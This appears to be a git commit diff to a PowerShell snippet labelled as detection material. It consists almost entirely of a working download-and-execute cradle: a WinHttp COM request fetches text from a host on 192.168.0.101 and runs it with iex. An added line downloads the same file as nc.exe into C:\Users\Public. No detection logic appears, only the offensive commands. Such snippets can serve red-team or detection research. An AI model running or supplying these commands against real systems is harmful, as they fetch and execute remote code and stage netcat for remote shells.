2ed527952bb45d641380d559949e7eb3a243e3c8
i0xid <97521668+kostya300@users.noreply.github.com>
2024-01-27 13:47:48 +0500

    Update DetectionWinHttpRequest1.sh

--- DetectionWinHttpRequest1.sh
+++ DetectionWinHttpRequest1.sh
@@ -1,4 +1,12 @@
+Detection:
+
+Invoke-WebRequest http://192.168.0.101:8000/t.txt -OutFile "C:\Users\Public\nc.exe" 
+
+
+
 $h=new-object -com WinHttp.WinHttpRequest.5.1
 $h.open('GET','http://192.168.0.101:8000/t.txt',$false);
 $h.send();
 iex $h.ResponseText
+
+
